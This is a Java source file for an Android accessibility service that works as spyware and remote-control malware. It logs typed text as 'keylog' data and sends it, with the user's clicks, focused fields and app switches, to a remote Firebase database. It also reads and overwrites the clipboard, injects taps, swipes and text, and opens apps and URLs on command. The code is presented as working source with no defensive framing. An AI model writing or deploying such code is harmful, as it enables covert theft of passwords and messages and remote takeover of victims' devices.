package com.example.foregroundservice;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService {
    private static final String TAG = "MyAccessibilityService";
    private DatabaseReference database;
    private String userId;
    private StringBuilder keylogBuffer = new StringBuilder();
    private boolean isKeylogging = false;

    @Override
    public void onCreate() {
        super.onCreate();
        database = FirebaseDatabase.getInstance().getReference();
        userId = getUserId();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (isKeylogging) {
            handleKeylogging(event);
        }
        handleAccessibilityEvent(event);
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Accessibility service connected");
        sendServiceStatus("connected");
    }

    private void handleKeylogging(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            if (!text.isEmpty()) {
                keylogBuffer.append(text);
                if (keylogBuffer.length() >= 100) {
                    sendKeylogData(keylogBuffer.toString());
                    keylogBuffer.setLength(0);
                }
            }
        }
    }

    private void handleAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleViewClicked(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                handleViewFocused(event);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowStateChanged(event);
                break;
        }
    }

    private void handleViewClicked(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            String className = source.getClassName().toString();
            String text = source.getText() != null ? source.getText().toString() : "";
            String contentDesc = source.getContentDescription() != null ? source.getContentDescription().toString() : "";
            JSONObject clickData = new JSONObject();
            try {
                clickData.put("type", "click");
                clickData.put("className", className);
                clickData.put("text", text);
                clickData.put("contentDesc", contentDesc);
                clickData.put("timestamp", System.currentTimeMillis());
                database.child("accessibility_events").child(userId).push().setValue(clickData.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error creating click data", e);
            }
            source.recycle();
        }
    }

    private void handleViewFocused(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            String className = source.getClassName().toString();
            String text = source.getText() != null ? source.getText().toString() : "";
            JSONObject focusData = new JSONObject();
            try {
                focusData.put("type", "focus");
                focusData.put("className", className);
                focusData.put("text", text);
                focusData.put("timestamp", System.currentTimeMillis());
                database.child("accessibility_events").child(userId).push().setValue(focusData.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error creating focus data", e);
            }
            source.recycle();
        }
    }

    private void handleWindowStateChanged(AccessibilityEvent event) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        String className = event.getClassName() != null ? event.getClassName().toString() : "";
        JSONObject windowData = new JSONObject();
        try {
            windowData.put("type", "window_change");
            windowData.put("packageName", packageName);
            windowData.put("className", className);
            windowData.put("timestamp", System.currentTimeMillis());
            database.child("accessibility_events").child(userId).push().setValue(windowData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error creating window data", e);
        }
    }

    public void startKeylogging() {
        isKeylogging = true;
        keylogBuffer.setLength(0);
        sendServiceStatus("keylogging_started");
    }

    public void stopKeylogging() {
        isKeylogging = false;
        if (keylogBuffer.length() > 0) {
            sendKeylogData(keylogBuffer.toString());
            keylogBuffer.setLength(0);
        }
        sendServiceStatus("keylogging_stopped");
    }

    private void sendKeylogData(String data) {
        JSONObject keylogData = new JSONObject();
        try {
            keylogData.put("type", "keylog");
            keylogData.put("data", data);
            keylogData.put("timestamp", System.currentTimeMillis());
            database.child("keylog_data").child(userId).push().setValue(keylogData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error sending keylog data", e);
        }
    }

    public String readClipboard() {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard.hasPrimaryClip()) {
            ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
            return item.getText().toString();
        }
        return "";
    }

    public void writeClipboard(String text) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("Remote Clipboard", text);
        clipboard.setPrimaryClip(clip);
    }

    public void injectTap(float x, float y) {
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
        dispatchGesture(builder.build(), null, null);
    }

    public void injectSwipe(float startX, float startY, float endX, float endY, long duration) {
        Path path = new Path();
        path.moveTo(startX, startY);
        path.lineTo(endX, endY);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
        dispatchGesture(builder.build(), null, null);
    }

    public void injectText(String text) {
        Bundle arguments = new Bundle();
        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        AccessibilityNodeInfo focusedNode = getRootInActiveWindow() != null ? getRootInActiveWindow().findFocus(AccessibilityNodeInfo.FOCUS_INPUT) : null;
        if (focusedNode != null) {
            focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
            focusedNode.recycle();
        }
    }

    public void showToast(String message) {
        Toast.makeText(this, message, Toast.LENGTH_LONG).show();
    }

    public List<String> getInstalledApps() {
        List<String> apps = new ArrayList<>();
        try {
            // This would require package usage stats permission
            // For now, we'll return a basic list
            apps.add("com.android.settings");
            apps.add("com.android.chrome");
            apps.add("com.whatsapp");
        } catch (Exception e) {
            Log.e(TAG, "Error getting installed apps", e);
        }
        return apps;
    }

    public void launchApp(String packageName) {
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error launching app: " + packageName, e);
        }
    }

    public void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(android.net.Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Error opening URL: " + url, e);
        }
    }

    private void sendServiceStatus(String status) {
        JSONObject statusData = new JSONObject();
        try {
            statusData.put("type", "accessibility_status");
            statusData.put("status", status);
            statusData.put("timestamp", System.currentTimeMillis());
            database.child("service_status").child(userId).setValue(statusData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error sending service status", e);
        }
    }

    private String getUserId() {
        // This should match the user ID used in the main service
        return "default_user";
    }
}